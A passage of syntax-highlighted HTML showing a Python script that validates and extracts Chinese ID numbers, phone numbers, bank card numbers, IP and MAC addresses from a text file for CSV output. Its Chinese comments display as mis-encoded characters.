</span></span><span class="line"><span class="cl">    <span class="n">sep_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;[\s\-\u00A0\u3000\u2013\u2014]&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">sep_pattern</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">18</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^\d</span><span class="si">{17}</span><span class="s1">[0-9Xx]$&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;æ— æ•ˆçš„æ ¼å¼æˆ–é•¿åº¦&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">birth_date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">14</span><span class="p">],</span> <span class="s2">&#34;%Y%m</span><span class="si">%d</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="mi">1900</span> <span class="o">&lt;=</span> <span class="n">birth_date</span><span class="o">.</span><span class="n">year</span> <span class="o">&lt;=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">year</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;æ— æ•ˆçš„å‡ºç”Ÿå¹´ä»½: </span><span class="si">{</span><span class="n">birth_date</span><span class="o">.</span><span class="n">year</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;æ— æ•ˆçš„å‡ºç”Ÿæ—¥æœŸ&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">weights</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">check_map</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;X&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">digit</span><span class="p">)</span> <span class="o">*</span> <span class="n">weight</span> <span class="k">for</span> <span class="n">digit</span><span class="p">,</span> <span class="n">weight</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s</span><span class="p">[:</span><span class="mi">17</span><span class="p">],</span> <span class="n">weights</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">expected_check</span> <span class="o">=</span> <span class="n">check_map</span><span class="p">[</span><span class="n">total</span> <span class="o">%</span> <span class="mi">11</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">!=</span> <span class="n">expected_check</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;æ ¡éªŒç ä¸åŒ¹é…: æœŸæœ›å€¼ </span><span class="si">{</span><span class="n">expected_check</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_phone</span><span class="p">(</span><span class="n">raw</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ ¡éªŒæ‰‹æœºå·çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦å’Œå·æ®µï¼‰ã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">digits</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\D&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">digits</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;86&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">11</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">digits</span> <span class="o">=</span> <span class="n">digits</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span> <span class="o">==</span> <span class="mi">11</span> <span class="ow">and</span> <span class="n">digits</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span> <span class="ow">in</span> <span class="n">ALLOWED_MOBILE_PREFIXES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_bankcard</span><span class="p">(</span><span class="n">raw</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ ¡éªŒé“¶è¡Œå¡å·çš„æœ‰æ•ˆæ€§ï¼ˆ16-19ä½çº¯æ•°å­— + Luhnç®—æ³•ï¼‰ã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="mi">16</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">raw</span><span class="o">.</span><span class="n">isdigit</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">luhn_check</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_ip</span><span class="p">(</span><span class="n">raw</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ ¡éªŒIPv4åœ°å€çš„æœ‰æ•ˆæ€§ï¼ˆ4ä¸ª0-255çš„æ•°å­—ï¼Œä¸å…è®¸å‰å¯¼é›¶ï¼‰ã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ— æ•ˆéƒ¨åˆ†ï¼Œå¦‚ &#39;01&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">p</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">isdigit</span><span class="p">()</span> <span class="ow">and</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">255</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_mac</span><span class="p">(</span><span class="n">raw</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ ¡éªŒMACåœ°å€çš„æœ‰æ•ˆæ€§ã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ­£åˆ™è¡¨è¾¾å¼å·²ç»éå¸¸ä¸¥æ ¼ï¼Œè¿™é‡Œä»…åšæœ€ç»ˆç¡®è®¤</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">:)</span><span class="si">{5}</span><span class="s1">[0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">raw</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ------------------- æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰ -------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¨¡å¼çš„é¡ºåºç»è¿‡ç²¾å¿ƒè®¾è®¡ï¼Œä»¥å‡å°‘åŒ¹é…æ­§ä¹‰ï¼šä¼˜å…ˆåŒ¹é…æ ¼å¼æœ€ç‰¹æ®Šçš„ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. MACåœ°å€ï¼šæ ¼å¼æ˜ç¡®ï¼Œä½¿ç”¨å†’å·åˆ†éš”ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">mac_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?P&lt;mac&gt;(?:[0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">:)</span><span class="si">{5}</span><span class="s1">[0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">)&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2. IPåœ°å€ï¼šæ ¼å¼æ˜ç¡®ï¼Œä½¿ç”¨ç‚¹åˆ†éš”ã€‚è¯¥æ­£åˆ™æ›´ç²¾ç¡®ï¼Œé¿å…åŒ¹é…å¦‚ 256.1.1.1 çš„æ— æ•ˆIPã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">ip_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?P&lt;ip&gt;(?&lt;!\d)(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.)</span><span class="si">{3}</span><span class="s1">(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?!\d))&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3. èº«ä»½è¯å·ï¼šç»“æ„ä¸º 6-8-4ï¼Œé•¿åº¦å›ºå®šï¼Œæ¯”çº¯æ•°å­—çš„é“¶è¡Œå¡æ›´å…·ç‰¹å¼‚æ€§ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">sep</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;[\s\-\u00A0\u3000\u2013\u2014]&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">id_pattern</span> <span class="o">=</span> <span class="sa">rf</span><span class="s1">&#39;(?P&lt;id&gt;(?&lt;!\d)\d</span><span class="se">{{</span><span class="s1">6</span><span class="se">}}</span><span class="s1">(?:</span><span class="si">{</span><span class="n">sep</span><span class="si">}</span><span class="s1">*)\d</span><span class="se">{{</span><span class="s1">8</span><span class="se">}}</span><span class="s1">(?:</span><span class="si">{</span><span class="n">sep</span><span class="si">}</span><span class="s1">*)\d</span><span class="se">{{</span><span class="s1">3</span><span class="se">}}</span><span class="s1">[0-9Xx](?!\d))&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 4. é“¶è¡Œå¡å·ï¼šåŒ¹é…16-19ä½çš„è¿ç»­æ•°å­—ã€‚è¿™æ˜¯æœ€é€šç”¨çš„é•¿æ•°å­—æ¨¡å¼ä¹‹ä¸€ï¼Œæ”¾åœ¨åé¢åŒ¹é…ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">bankcard_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?P&lt;bankcard&gt;(?&lt;!\d)\d{16,19}(?!\d))&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 5. æ‰‹æœºå·ï¼šåŒ¹é…11ä½æ•°å­—çš„ç‰¹å®šæ ¼å¼ï¼Œæ”¾åœ¨æœ€åä»¥é¿å…é”™è¯¯åŒ¹é…æ›´é•¿æ•°å­—ä¸²çš„å‰ç¼€ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">phone_prefix</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?:\(\+86\)|\+86\s*)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">phone_body</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?:\d</span><span class="si">{11}</span><span class="s1">|\d</span><span class="si">{3}</span><span class="s1">[ -]\d</span><span class="si">{4}</span><span class="s1">[ -]\d</span><span class="si">{4}</span><span class="s1">)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">phone_pattern</span> <span class="o">=</span> <span class="sa">rf</span><span class="s1">&#39;(?P&lt;phone&gt;(?&lt;!\d)(?:</span><span class="si">{</span><span class="n">phone_prefix</span><span class="si">}</span><span class="s1">)?</span><span class="si">{</span><span class="n">phone_body</span><span class="si">}</span><span class="s1">(?!\d))&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å°†æ‰€æœ‰æ¨¡å¼ç¼–è¯‘æˆä¸€ä¸ªå¤§çš„æ­£åˆ™è¡¨è¾¾å¼</span>
</span></span><span class="line"><span class="cl"><span class="n">combined_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">mac_pattern</span><span class="si">}</span><span class="s1">|</span><span class="si">{</span><span class="n">ip_pattern</span><span class="si">}</span><span class="s1">|</span><span class="si">{</span><span class="n">id_pattern</span><span class="si">}</span><span class="s1">|</span><span class="si">{</span><span class="n">bankcard_pattern</span><span class="si">}</span><span class="s1">|</span><span class="si">{</span><span class="n">phone_pattern</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">UNICODE</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ------------------- ä¸»é€»è¾‘ -------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_from_text</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    ä½¿ç”¨å•ä¸€çš„ã€ç»„åˆçš„æ­£åˆ™è¡¨è¾¾å¼ä»æ–‡æœ¬ä¸­æŸ¥æ‰¾æ‰€æœ‰å€™é€‰è€…ï¼Œå¹¶é€ä¸€æ ¡éªŒã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="k">match</span> <span class="ow">in</span> <span class="n">combined_re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">kind</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">lastgroup</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="n">kind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;mac&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_valid_mac</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— macã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;mac&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ‹’ç» macã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;ip&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_valid_ip</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— ipã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;ip&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ‹’ç» ipã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;id&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">is_valid</span><span class="p">,</span> <span class="n">reason</span> <span class="o">=</span> <span class="n">is_valid_id</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— idcardã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;idcard&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># é™çº§å¤„ç†ï¼šå¦‚æœä½œä¸ºèº«ä»½è¯æ ¡éªŒå¤±è´¥ï¼Œåˆ™å°è¯•ä½œä¸ºé“¶è¡Œå¡æ ¡éªŒ</span>
</span></span><span class="line"><span class="cl">                <span class="n">digits_only</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\D&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">is_valid_bankcard</span><span class="p">(</span><span class="n">digits_only</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— id-&gt;bankcardã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># è§„èŒƒè¦æ±‚ä¿ç•™åŸå§‹æ ¼å¼</span>
</span></span><span class="line"><span class="cl">                    <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;bankcard&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ‹’ç» idã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2"> (åŸå› : </span><span class="si">{</span><span class="n">reason</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;bankcard&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_valid_bankcard</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— bankcardã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;bankcard&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ‹’ç» bankcardã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;phone&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_valid_phone</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ¥å— phoneã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;phone&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ã€æ‹’ç» phoneã€‘: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">results</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ä¸»å‡½æ•°ï¼šè¯»å–æ–‡ä»¶ï¼Œæ‰§è¡Œæå–ï¼Œå†™å…¥CSVã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">INPUT_FILE</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;é”™è¯¯: è¾“å…¥æ–‡ä»¶ &#39;</span><span class="si">{</span><span class="n">INPUT_FILE</span><span class="si">}</span><span class="s2">&#39; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿è¯¥æ–‡ä»¶å­˜åœ¨äºè„šæœ¬è¿è¡Œç›®å½•ä¸‹ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># åˆ›å»ºä¸€ä¸ªç©ºçš„data.txtä»¥ç¡®ä¿è„šæœ¬å¯ä»¥è¿è¡Œ</span>
